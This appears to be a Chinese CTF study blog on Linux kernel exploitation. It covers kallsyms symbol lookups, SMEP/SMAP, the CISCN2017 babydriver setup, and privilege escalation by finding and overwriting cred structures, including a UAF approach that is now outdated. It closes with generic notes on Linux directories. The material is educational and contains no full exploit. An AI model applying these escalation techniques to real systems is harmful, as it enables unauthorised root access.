<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">post sudo grep commit_creds /proc/kallsyms </span><br><span class="line">[sudo] m4x 的密码：</span><br><span class="line">ffffffffbb6af9e0 T commit_creds</span><br><span class="line">ffffffffbc7cb3d0 r __ksymtab_commit_creds</span><br><span class="line">ffffffffbc7f06fe r __kstrtab_commit_creds</span><br><span class="line">post sudo grep prepare_kernel_cred /proc/kallsyms</span><br><span class="line">ffffffffbb6afd90 T prepare_kernel_cred</span><br><span class="line">ffffffffbc7d4f20 r __ksymtab_prepare_kernel_cred</span><br><span class="line">ffffffffbc7f06b7 r __kstrtab_prepare_kernel_cred</span><br></pre></td></tr></table></figure>



<blockquote>
<p>一般情况下，&#x2F;proc&#x2F;kallsyms 的内容需要 root 权限才能查看</p>
</blockquote>
<h2 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h2><blockquote>
<p>canary, dep, PIE, RELRO 等保护与用户态原理和作用相同</p>
</blockquote>
<ul>
<li>smep: Supervisor Mode Execution Protection，当处理器处于 <code>ring0</code> 模式，执行 <code>用户空间</code> 的代码会触发页错误。（在 arm 中该保护称为 <code>PXN</code>）</li>
<li>smap: Superivisor Mode Access Protection，类似于 smep，通常是在访问数据时。</li>
<li>mmap_min_addr:是一个内核参数，用于限制用户空间可以使用的最低内存地址。</li>
</ul>
<h2 id="CTF-kernel-pwn-相关"><a href="#CTF-kernel-pwn-相关" class="headerlink" title="CTF kernel pwn 相关"></a>CTF kernel pwn 相关</h2><p>一般会给以下三个文件</p>
<ol>
<li><p>boot.sh: 一个用于启动 kernel 的 shell 的脚本，多用 qemu，保护措施与 qemu 不同的启动参数有关</p>
</li>
<li><p>bzImage: kernel binary</p>
</li>
<li><p>rootfs.cpio: 文件系统映像</p>
<p>比如：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">CISCN2017_babydriver [master●] ls</span><br><span class="line">babydriver.tar</span><br><span class="line">CISCN2017_babydriver [master●] x babydriver.tar</span><br><span class="line">boot.sh</span><br><span class="line">bzImage</span><br><span class="line">rootfs.cpio</span><br><span class="line">CISCN2017_babydriver [master●] ls</span><br><span class="line">babydriver.tar  boot.sh  bzImage  rootfs.cpio</span><br><span class="line">CISCN2017_babydriver [master●] file bzImage</span><br><span class="line">bzImage: Linux kernel x86 boot executable bzImage, version <span class="number">4.4</span><span class="number">.72</span> (atum@ubuntu) #<span class="number">1</span> SMP Thu Jun <span class="number">15</span> <span class="number">19</span>:<span class="number">52</span>:<span class="number">50</span> PDT <span class="number">2017</span>, RO-rootFS, swap_dev <span class="number">0x6</span>, Normal VGA</span><br><span class="line">CISCN2017_babydriver [master●] file rootfs.cpio</span><br><span class="line">rootfs.cpio: gzip compressed data, last modified: Tue Jul  <span class="number">4</span> <span class="number">08</span>:<span class="number">39</span>:<span class="number">15</span> <span class="number">2017</span>, max compression, from Unix, original size <span class="number">2844672</span></span><br><span class="line">CISCN2017_babydriver [master●] file boot.sh</span><br><span class="line">boot.sh: Bourne-Again shell script, ASCII text executable</span><br><span class="line">CISCN2017_babydriver [master●] bat boot.sh </span><br><span class="line">───────┬─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">       │ File: boot.sh</span><br><span class="line">───────┼─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   <span class="number">1</span>   │ #!/bin/bash</span><br><span class="line">   <span class="number">2</span>   │ </span><br><span class="line">   <span class="number">3</span>   │ qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append <span class="string">&#x27;console=ttyS0 ro</span></span><br><span class="line"><span class="string">       │ ot=/dev/ram oops=panic panic=1&#x27;</span> -enable-kvm -monitor /dev/null -m <span class="number">64</span>M --nographi</span><br><span class="line">       │ c  -smp cores=<span class="number">1</span>,threads=<span class="number">1</span> -cpu kvm64,+smep</span><br><span class="line">───────┴─────────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure>

<p>解释一下 qemu 启动的参数：</p>
<ul>
<li>-initrd rootfs.cpio，使用 rootfs.cpio 作为内核启动的文件系统</li>
<li>-kernel bzImage，使用 bzImage 作为 kernel 映像</li>
<li>-cpu kvm64,+smep，设置 CPU 的安全选项，这里开启了 smep</li>
<li>-m 64M，设置虚拟 RAM 为 64M，默认为 128M 其他的选项可以通过 –help 查看。</li>
</ul>
</li>
<li><p>本地写好 exploit 后，可以通过 base64 编码等方式把编译好的二进制文件保存到远程目录下，进而拿到 flag。同时可以使用 musl, uclibc 等方法减小 exploit 的体积方便传输。</p>
</li>
</ol>
<p>在 Linux 内核漏洞利用中，攻击者可能会有以下几个目的</p>
<ul>
<li>提权，即获取到 root 权限。</li>
<li>泄露敏感信息。</li>
<li>DoS，即使得内核崩溃。</li>
</ul>
<p><strong>一般而言，攻击者的主要目的是提权。</strong></p>
<h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>内核提权指的是普通用户可以获取到 root 用户的权限，访问原先受限的资源。这里从两种角度来考虑如何提权</p>
<ul>
<li>改变自身：通过改变自身进程的权限，使其具有 root 权限。</li>
<li>改变别人：通过影响高权限进程的执行，使其完成我们想要的功能。</li>
</ul>
<h2 id="Change-Self"><a href="#Change-Self" class="headerlink" title="Change Self"></a>Change Self</h2><p>内核会通过进程的 <code>task_struct</code> 结构体中的 cred 指针来索引 cred 结构体，然后根据 cred 的内容来判断一个进程拥有的权限，如果 cred 结构体成员中的 uid-fsgid 都为 0，那一般就会认为进程具有 root 权限。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="type">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="type">void</span>        *put_addr;</span><br><span class="line">    <span class="type">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="type">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此，思路就比较直观了，我们可以通过以下方式来提权</p>
<ul>
<li>直接修改 cred 结构体的内容</li>
<li>修改 task_struct 结构体中的 cred 指针指向一个满足要求的 cred</li>
</ul>
<p>无论是哪一种方法，一般都分为两步：定位，修改。这就好比把大象放到冰箱里一样。</p>
<h2 id="直接改-cred"><a href="#直接改-cred" class="headerlink" title="直接改 cred"></a>直接改 cred</h2><h3 id="定位具体位置"><a href="#定位具体位置" class="headerlink" title="定位具体位置"></a>定位具体位置</h3><p>我们可以首先获取到 cred 的具体地址，然后修改 cred。</p>
<h4 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h4><p>定位 cred 的具体地址有很多种方法，这里根据是否直接定位分为以下两种</p>
<h5 id="直接定位"><a href="#直接定位" class="headerlink" title="直接定位"></a>直接定位</h5><p>cred 结构体的最前面记录了各种 id 信息，对于一个普通的进程而言，uid-fsgid 都是执行进程的用户的身份。因此我们可以通过扫描内存来定位 cred。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="type">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="type">void</span>        *put_addr;</span><br><span class="line">    <span class="type">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="type">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>在实际定位的过程中，我们可能会发现很多满足要求的 cred，这主要是因为 cred 结构体可能会被拷贝、释放。</strong>一个很直观的想法是在定位的过程中，<strong>利用 usage 不为 0 来筛除掉一些 cred</strong>，但仍然会发现一些 usage 为 0 的 cred。这是因为 cred 从 usage 为 0， 到释放有一定的时间。此外，cred 是使用 rcu 延迟释放的。</p>
<blockquote>
<p>usage字段是cred结构体中的一个计数器，用于记录对该cred结构体的引用数。每当有一个进程引用该cred结构体时，usage计数就会增加；当引用结束时，计数就会减少。这个计数机制被用于管理cred结构体的生命周期和内存释放。</p>
<p>具体来说，usage的作用有以下几个方面：</p>
<ol>
<li>引用计数：usage字段用于跟踪cred结构体的引用次数。通过增加和减少usage计数，内核可以确定何时可以安全地释放cred结构体的内存。</li>
<li>延迟释放：cred结构体的释放是通过RCU（Read-Copy-Update）机制来延迟执行的。当usage计数减少到0时，并不立即释放cred结构体的内存，而是延迟到合适的时机，以确保没有正在使用该cred结构体的代码存在。</li>
<li>进程共享：由于cred结构体可以被多个进程引用，通过共享同一个cred结构体，可以节省内存和提高性能。usage计数的增加和减少反映了cred结构体的引用情况，确保在没有进程引用时才释放相关的资源。</li>
</ol>
<p>在定位cred结构体的过程中，通过检查usage字段可以了解当前有多少进程正在引用该cred结构体。如果发现usage为0，表示当前没有进程引用该cred结构体，可能可以安全地释放它。但需要注意的是，由于RCU的延迟释放机制，即使usage为0，cred结构体的内存也可能不会立即释放，而是会在合适的时机进行释放。</p>
</blockquote>
<h5 id="间接定位"><a href="#间接定位" class="headerlink" title="间接定位"></a>间接定位</h5><h6 id="task-struct"><a href="#task-struct" class="headerlink" title="task_struct"></a>task_struct</h6><p>进程的 <code>task_struct</code> 结构体中会存放指向 cred 的指针，因此我们可以</p>
<ol>
<li>定位当前进程 <code>task_struct</code> 结构体的地址</li>
<li>根据 cred 指针相对于 task_struct 结构体的偏移计算得出 <code>cred</code> 指针存储的地址</li>
<li>获取 <code>cred</code> 具体的地址</li>
</ol>
<h6 id="comm"><a href="#comm" class="headerlink" title="comm"></a>comm</h6><p>comm 用来标记可执行文件的名字，位于进程的 <code>task_struct</code> 结构体中。我们可以发现 comm 其实在 cred 的正下方，所以我们也可以先定位 comm ，然后定位 cred 的地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>     *<span class="title">ptracer_cred</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>     *<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>     *<span class="title">cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="comment">/* Cached requested key. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>          *<span class="title">cached_requested_key</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * executable name, excluding path.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * - normally initialized setup_new_exec()</span></span><br><span class="line"><span class="comment">     * - access it with [gs]et_task_comm()</span></span><br><span class="line"><span class="comment">     * - lock it with task_lock()</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">char</span>                comm[TASK_COMM_LEN];</span><br></pre></td></tr></table></figure>

<p>然而，在进程名字并不特殊的情况下，内核中可能会有多个同样的字符串，这会影响搜索的正确性与效率。因此，我们可以使用 prctl 设置进程的 comm 为一个特殊的字符串，然后再开始定位 comm。</p>
<blockquote>
<p>在Linux系统中，prctl（Process Control）是一个系统调用，用于控制和修改进程的各种属性和行为。通过prctl系统调用，可以对进程进行各种操作，如设置进程的名称、获取和修改进程的资源限制、修改进程的信号处理方式等。</p>
<p>具体来说，prctl系统调用的功能包括但不限于以下几个方面：</p>
<ol>
<li>进程名称（comm）的设置：可以使用prctl系统调用来设置进程的名称。进程名称是在进程表中标识进程的一个字符串。通过设置特殊的进程名称，可以在定位和识别进程时提供更多的信息。</li>
<li>进程资源限制的获取和修改：可以使用prctl系统调用来获取和修改进程的资源限制，如CPU时间限制、内存限制、文件描述符限制等。这可以帮助控制进程的资源使用情况，以及保护系统免受恶意进程的影响。</li>
<li>进程信号处理方式的修改：可以使用prctl系统调用来修改进程接收和处理信号的方式。可以设置进程忽略某些信号、捕获和处理某些信号，或者恢复默认的信号处理方式。</li>
<li>进程状态的获取和修改：可以使用prctl系统调用来获取和修改进程的状态信息，如进程的运行状态、终止状态等。这可以用于监控和管理进程的状态。</li>
<li>其他进程控制操作：prctl系统调用还提供其他一些进程控制操作，如设置线程名字、获取和修改进程的调度策略和优先级、获取和修改进程的安全上下文等。</li>
</ol>
<p>通过使用prctl系统调用，可以对进程进行灵活的控制和管理，以满足特定的需求和场景。在定位进程时，可以使用prctl设置进程的名称（comm）为特殊的字符串，以便更方便地进行搜索和识别。</p>
</blockquote>
<h4 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h4><p>在这种方法下，我们可以直接将 cred 中的 uid-fsgid 都修改为 0。当然修改的方式有很多种，比如说</p>
<ul>
<li>在我们具有任意地址读写后，可以直接修改 cred。</li>
<li>在我们可以 ROP 执行代码后，可以利用 ROP gadget 修改 cred。</li>
</ul>
<h3 id="间接定位-1"><a href="#间接定位-1" class="headerlink" title="间接定位"></a>间接定位</h3><p>虽然我们确实想要修改 cred 的内容，但是不一定非得知道 cred 的具体位置，我们只需要能够修改 cred 即可。</p>
<h4 id="（已过时）UAF-使用同样堆块"><a href="#（已过时）UAF-使用同样堆块" class="headerlink" title="（已过时）UAF 使用同样堆块"></a>（已过时）UAF 使用同样堆块</h4><p>如果我们在进程初始化时能控制 cred 结构体的位置，并且我们可以在初始化后修改该部分的内容，那么我们就可以很容易地达到提权的目的。这里给出一个典型的例子</p>
<ol>
<li>申请一块与 cred 结构体大小一样的堆块</li>
<li>释放该堆块</li>
<li>fork 出新进程，恰好使用刚刚释放的堆块</li>
<li>此时，修改 cred 结构体特定内存，从而提权</li>
</ol>
<p>但是<strong>此种方法在较新版本内核中已不再可行，我们已无法直接分配到 cred_jar 中的 object</strong>，这是因为 cred_jar 在创建时设置了 <code>SLAB_ACCOUNT</code> 标记，在 <code>CONFIG_MEMCG_KMEM=y</code> 时（默认开启）<strong>cred_jar 不会再与相同大小的 kmalloc-192 进行合并</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __init <span class="title function_">cred_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* allocate a slab in which we can store credentials */</span></span><br><span class="line">    cred_jar = kmem_cache_create(<span class="string">&quot;cred_jar&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> cred), <span class="number">0</span>,</span><br><span class="line">            SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="内核的文件系统"><a href="#内核的文件系统" class="headerlink" title="内核的文件系统"></a>内核的文件系统</h1><h2 id="dev文件"><a href="#dev文件" class="headerlink" title="dev文件"></a>dev文件</h2><p>在Linux系统中，<code>/dev</code>目录是一个特殊的目录，用于表示<strong>设备文件</strong>。设备文件是用于<strong>与系统中的硬件设备或其他特殊设备进行交互的接口</strong>。<code>/dev</code>目录中的文件对应着系统中的各种设备，包括磁盘驱动器、串口、打印机等。</p>
<p>下面是一些常见的<code>/dev</code>目录中的设备文件及其含义：</p>
<ol>
<li><code>/dev/null</code>：一个特殊的设备文件，用于丢弃所有写入它的数据。读取它将立即返回文件结束。</li>
<li><code>/dev/zero</code>：一个特殊的设备文件，用于提供无限的零字节数据。读取它将返回连续的零字节。</li>
<li><code>/dev/random</code>和<code>/dev/urandom</code>：这些设备文件用于<strong>生成随机数</strong>据。<code>/dev/random</code>提供高质量的随机数据，但当熵池耗尽时会阻塞读取操作。<code>/dev/urandom</code>则不会阻塞，但在熵池耗尽时可能提供较低质量的随机数据。</li>
<li><code>/dev/tty</code>：<strong>代表当前终端设备的设备文件</strong>。它通常用于与终端进行交互，例如读取键盘输入或向终端输出数据。</li>
<li><code>/dev/sda</code>、<code>/dev/sdb</code>等：这些设备文件表示系统中的物理磁盘驱动器。每个磁盘驱动器都被分配一个相应的设备文件，用于进行磁盘操作，如读取和写入数据。</li>
<li><code>/dev/input/eventX</code>：这些设备文件表示输入设备，如键盘、鼠标和触摸屏。每个输入设备都被分配一个对应的设备文件，用于读取设备的输入事件。</li>
<li><code>/dev/videoX</code>：这些设备文件代表视频设备，如摄像头。每个视频设备都被分配一个对应的设备文件，用于捕获视频数据。</li>
</ol>
<h2 id="bin文件"><a href="#bin文件" class="headerlink" title="bin文件"></a>bin文件</h2><p>在计算机领域中，”bin”一词通常是指二进制文件（Binary file）。二进制文件是一种以二进制形式存储的文件，其中包含计算机可执行代码或非文本数据。</p>
<p>二进制文件与文本文件不同，它们不是使用可读的字符编码（如ASCII或UTF-8）表示的文本数据，而是以机器可执行的二进制形式存储的数据。二进制文件可以包含编译后的程序代码、可执行文件、库文件、图像、音频、视频等各种非文本数据。</p>
<p>二进制文件通常由编译器、链接器或其他工具生成，用于在计算机上执行特定的操作。例如，可执行文件（executable file）是一种特殊的二进制文件，包含了计算机可直接执行的指令和数据，用于运行程序。库文件（library file）是包含可重用代码和函数的二进制文件，用于在程序开发中进行链接和共享。</p>
<p>二进制文件的内容对于人类来说通常是不可读的，因为它们不是使用文本编码表示的。要查看二进制文件的内容，通常需要使用特定的工具或程序进行解析和处理。</p>
<p>总结起来，”bin”文件是指二进制文件，其中包含了以二进制形式存储的计算机可执行代码或非文本数据。它们在计算机系统中起着重要的作用，用于存储和执行各种类型的程序和数据。</p>
<h2 id="etc文件"><a href="#etc文件" class="headerlink" title="etc文件"></a>etc文件</h2><p>在类Unix操作系统中，<code>/etc</code>目录是一个非常重要的目录，它用于存放系统的配置文件。这个目录包含了系统大部分的配置文件和子目录。我们可以将其视为系统的“设置中心”。下面是一些<code>/etc</code>目录下常见的文件和子目录的中文详解：</p>
<ol>
<li>**<code>/etc/passwd</code>**：这是一个用户账户信息文件，记录了系统上每个用户的基本信息，例如用户ID、组ID、家目录、登录shell等。虽然这个文件包含密码信息的位置，但现代系统中密码通常是加密后存储在<code>/etc/shadow</code>中。</li>
<li>**<code>/etc/shadow</code>**：存储加密后的用户密码以及与密码相关的管理信息，如密码更改日期、过期时间等。出于安全考虑，这个文件的读权限非常严格，通常只有超级用户（root）可以访问。</li>
<li>**<code>/etc/group</code>**：类似于<code>/etc/passwd</code>，但这个文件记录的是组的信息，包括组名、组密码（很少使用）、组ID以及属于该组的用户列表。</li>
<li>**<code>/etc/fstab</code>**：文件系统表，这个文件包含了系统启动时需要挂载的分区和存储设备的信息，包括设备名、挂载点、文件系统类型、挂载选项等。</li>
<li>**<code>/etc/hosts</code>**：这是一个本地DNS解析文件，用于将主机名映射到IP地址。在进行DNS查询之前，系统会首先检查这个文件。</li>
<li>**<code>/etc/resolv.conf</code>**：DNS客户端的配置文件，指定了系统解析域名时应该查询的DNS服务器的IP地址。</li>
<li>**<code>/etc/sysctl.conf</code>**：用于配置内核参数的文件。系统管理员可以通过编辑这个文件来调整和优化系统的运行参数。</li>
<li>**<code>/etc/crontab</code>**：系统定时任务配置文件，允许系统管理员安排在特定时间自动执行的任务。</li>
<li>**<code>/etc/services</code>**：这个文件列出了网络服务和对应的端口号，例如HTTP通常对应端口80。这有助于软件和服务找到它们应该使用的标准端口。</li>
<li>**<code>/etc/network/interfaces</code>**（在一些系统中）：网络接口配置文件，用于设置网络接口的IP地址、子网掩码、网关等网络参数。</li>
</ol>
<p>这只是<code>/etc</code>目录下一小部分文件和目录的简介。<code>/etc</code>目录下的文件和子目录数量众多，且随着不同的发行版和系统配置的不同而有所变化。管理员和高级用户通常需要根据具体需求编辑这些文件来配置系统。</p>
<h2 id="home文件"><a href="#home文件" class="headerlink" title="home文件"></a>home文件</h2><p>在类Unix操作系统中，<code>/home</code>目录扮演着非常重要的角色，它是用户的个人目录的默认存放位置。每个在系统上有账户的普通用户都会在<code>/home</code>目录下拥有一个与其用户名同名的目录，用来存储个人文件、配置文件、用户级的程序设置等。以下是对<code>/home</code>目录的详细解释：</p>
<h3 id="home目录的作用"><a href="#home目录的作用" class="headerlink" title="/home目录的作用"></a><code>/home</code>目录的作用</h3><ul>
<li><strong>用户数据存储</strong>：用户可以在自己的<code>/home</code>子目录中存储个人文件、文档、图片、音乐等数据。</li>
<li><strong>用户配置文件</strong>：很多程序会在用户的<code>/home</code>子目录中创建隐藏文件或目录（文件或目录名以<code>.</code>开头）来存储程序的用户级配置。例如，浏览器可能会在用户的<code>/home</code>子目录下创建一个隐藏的配置目录来存储书签和历史记录。</li>
<li><strong>用户级软件安装</strong>：用户可以在自己的<code>/home</code>目录下安装软件或脚本，这些软件或脚本只对当前用户有效，不影响系统中的其他用户。</li>
</ul>
<h3 id="home目录的特点"><a href="#home目录的特点" class="headerlink" title="/home目录的特点"></a><code>/home</code>目录的特点</h3><ul>
<li><strong>隔离性</strong>：每个用户的<code>/home</code>子目录是独立的，这意味着一个用户默认情况下无法访问另一个用户的<code>/home</code>子目录。这提供了一定程度的数据隔离和隐私保护。</li>
<li><strong>备份与迁移</strong>：由于用户的个人数据和配置都存储在<code>/home</code>目录下，这使得备份和迁移用户数据变得相对简单。系统管理员可以通过备份整个<code>/home</code>目录来备份所有用户的个人数据。</li>
<li><strong>灵活性</strong>：如果系统需要重新安装或升级，通常不需要对<code>/home</code>目录进行更改，这意味着用户的个人设置和数据可以在系统升级或重装后保持不变。</li>
</ul>
<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul>
<li><strong>存储空间管理</strong>：在有限的磁盘空间情况下，<code>/home</code>目录可能会成为存储空间不足的瓶颈。因此，管理好<code>/home</code>目录下的存储空间使用情况是很重要的。</li>
<li><strong>安全性</strong>：虽然<code>/home</code>目录提供了用户数据的隔离，但是如果系统的安全设置不当，恶意用户或程序仍然有可能访问或修改其他用户的数据。因此，保持系统的安全更新和合理配置权限是非常重要的。</li>
</ul>
<p>总的来说，<code>/home</code>目录是类Unix操作系统中非常关键的一个组成部分，它为用户提供了一个存储个人数据和配置的空间，同时也带来了一系列的管理和安全上的考虑。</p>
<h2 id="lib文件"><a href="#lib文件" class="headerlink" title="lib文件"></a>lib文件</h2><p>在类Unix操作系统中，<code>/lib</code>目录是一个关键的系统目录，用于存放操作系统运行所需的基本共享库文件和内核模块。这些库文件对于系统的正常运行至关重要，因为它们提供了许多基本的功能，供不同的程序和服务调用。以下是对<code>/lib</code>目录的详细解释：</p>
<h3 id="lib目录的作用"><a href="#lib目录的作用" class="headerlink" title="/lib目录的作用"></a><code>/lib</code>目录的作用</h3><ul>
<li><strong>共享库</strong>：<code>/lib</code>目录包含了系统最基本的共享库文件，这些文件类似于Windows操作系统中的DLL文件。它们提供了许多常用的功能，如文件操作、数学计算、字符串处理等，可以被系统中的多个程序共同使用。</li>
<li><strong>内核模块</strong>：<code>/lib</code>目录还存放了内核模块（在<code>/lib/modules</code>目录下），这些模块可以在系统运行时动态加载或卸载，用于支持硬件设备、文件系统类型等。</li>
</ul>
<h3 id="lib目录的特点"><a href="#lib目录的特点" class="headerlink" title="/lib目录的特点"></a><code>/lib</code>目录的特点</h3><ul>
<li><strong>核心依赖</strong>：<code>/lib</code>目录中的文件是系统启动和运行的核心依赖。例如，即使是最基本的命令行工具，如<code>ls</code>或<code>bash</code>，也需要调用<code>/lib</code>目录中的库文件来执行。</li>
<li><strong>动态链接</strong>：存放在<code>/lib</code>目录中的共享库文件通常是动态链接的，意味着程序在运行时才会加载这些库文件。这种方式可以减少程序的磁盘和内存占用，因为多个程序可以共享同一份库文件，而不是每个程序都包含自己的库副本。</li>
</ul>
<h3 id="lib目录下的重要子目录"><a href="#lib目录下的重要子目录" class="headerlink" title="/lib目录下的重要子目录"></a><code>/lib</code>目录下的重要子目录</h3><ul>
<li>**<code>/lib32</code>和<code>/lib64</code>**：在64位系统中，<code>/lib</code>目录可能会包含<code>/lib32</code>和<code>/lib64</code>子目录，分别用于存放32位和64位的库文件。这样做是为了保持对32位应用程序的兼容性。</li>
<li>**<code>/lib/modules</code>**：存放内核模块的目录，这些模块可以根据需要动态加载到内核中。</li>
</ul>
<h3 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h3><ul>
<li><strong>系统稳定性</strong>：由于<code>/lib</code>目录包含了系统的核心库文件，任何对这些文件的不当修改都可能导致系统不稳定或无法启动。</li>
